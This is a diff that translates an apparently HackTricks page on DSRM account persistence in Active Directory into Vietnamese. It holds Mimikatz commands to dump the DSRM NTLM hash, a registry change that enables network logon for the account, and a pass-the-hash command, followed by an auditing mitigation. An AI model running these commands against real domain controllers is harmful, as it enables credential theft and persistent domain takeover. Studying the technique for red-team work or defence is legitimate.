@@ -1,18 +1,18 @@
-# DSRM Credentials
+# Thông tin xác thực DSRM
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Information
+## Thông tin cơ bản
 
-Every domain controller has a Directory Services Restore Mode (DSRM) administrator account. Its password is set during domain-controller promotion and is separate from Active Directory domain accounts.<sup>[[1]](#references)</sup>
+Mỗi domain controller đều có tài khoản quản trị viên Directory Services Restore Mode (DSRM). Mật khẩu của tài khoản này được đặt trong quá trình nâng cấp domain controller và tách biệt với các tài khoản domain Active Directory.<sup>[[1]](#references)</sup>
 
-An attacker with administrative control of a domain controller can dump the local SAM database and recover the DSRM Administrator NTLM hash. The following Mimikatz command performs that operation:<sup>[[2]](#references)</sup>
+Kẻ tấn công có quyền kiểm soát quản trị trên domain controller có thể dump cơ sở dữ liệu SAM cục bộ và khôi phục NTLM hash của tài khoản quản trị viên DSRM. Lệnh Mimikatz sau đây thực hiện thao tác đó:<sup>[[2]](#references)</sup>
 
 ```powershell
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
 
-By default, the DSRM account is intended for restore mode. Setting `DsrmAdminLogonBehavior` to `2` permits this local account to authenticate while the domain controller is running normally. Check the value before changing it:<sup>[[2]](#references)[[3]](#references)</sup>
+Theo mặc định, tài khoản DSRM chỉ dành cho chế độ khôi phục. Đặt `DsrmAdminLogonBehavior` thành `2` cho phép tài khoản cục bộ này xác thực khi domain controller đang hoạt động bình thường. Kiểm tra giá trị trước khi thay đổi:<sup>[[2]](#references)[[3]](#references)</sup>
 
 ```powershell
 $lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
@@ -25,7 +25,7 @@ if ($null -eq $current) {
 }
 ```
 
-The recovered hash can then be used in a pass-the-hash session to access resources such as the administrative `C$` share. For this local account, use the domain controller's computer name as the `/domain` value:<sup>[[3]](#references)</sup>
+Hash được khôi phục sau đó có thể được dùng trong phiên pass-the-hash để truy cập các tài nguyên như share quản trị `C$`. Với tài khoản cục bộ này, hãy dùng tên máy tính của domain controller làm giá trị `/domain`:<sup>[[3]](#references)</sup>
 
 ```powershell
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
@@ -33,15 +33,14 @@ sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3a
 ls \\dc-host-name\C$
 ```
 
-## Mitigation
+## Biện pháp giảm thiểu
 
-- Audit changes to `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Security event 4657 records a registry value modification when the key's SACL is configured to audit **Set Value** operations.<sup>[[4]](#references)</sup>
+- Kiểm tra các thay đổi đối với `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Sự kiện bảo mật 4657 ghi lại việc sửa đổi giá trị registry khi SACL của khóa được cấu hình để kiểm tra các thao tác **Set Value**.<sup>[[4]](#references)</sup>
 
 ## References
 
-- [1] [Microsoft: Reset the Directory Services Restore Mode administrator password](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
-- [2] [ADSecurity: Sneaky Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
-- [3] [ADSecurity: Sneaky Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
-- [4] [Microsoft: Event 4657 — A registry value was modified](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
-
+- [1] [Microsoft: Đặt lại mật khẩu quản trị viên Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
+- [2] [ADSecurity: Duy trì quyền truy cập dai dẳng trong Active Directory một cách tinh vi #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
+- [3] [ADSecurity: Duy trì quyền truy cập dai dẳng trong Active Directory một cách tinh vi #13 — Duy trì quyền truy cập dai dẳng bằng DSRM v2](https://adsecurity.org/?p=1785)
+- [4] [Microsoft: Sự kiện 4657 — Một giá trị registry đã được sửa đổi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
 {{#include ../../banners/hacktricks-training.md}}
